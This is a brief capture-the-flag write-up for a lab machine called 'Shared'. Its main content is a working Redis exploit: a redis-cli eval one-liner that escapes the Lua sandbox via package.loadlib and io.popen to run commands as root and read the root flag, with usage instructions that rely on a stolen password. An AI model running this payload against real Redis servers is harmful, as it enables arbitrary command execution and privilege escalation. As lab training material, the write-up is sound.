# Shared

The box involves classic web exploitation, but the root flag requires hacking with Redis:

```sh
# hack.sh

redis-cli --pass "$1" eval 'local t = package.loadlib("/usr/lib/x86_64-linux-gnu/liblua5.1.so.0", "luaopen_io"); local io = t(); local b = io.popen("cat /root/root.txt"); local s = b:read("*a"); b:close(); return s' 0;
```

Use it like that on the victim's machine: `sh hack.sh {REDIS_ROOT_PASSWORD_YOU_HACKED}`

[Source for inspiration](https://cn-sec.com/archives/1159396.html)
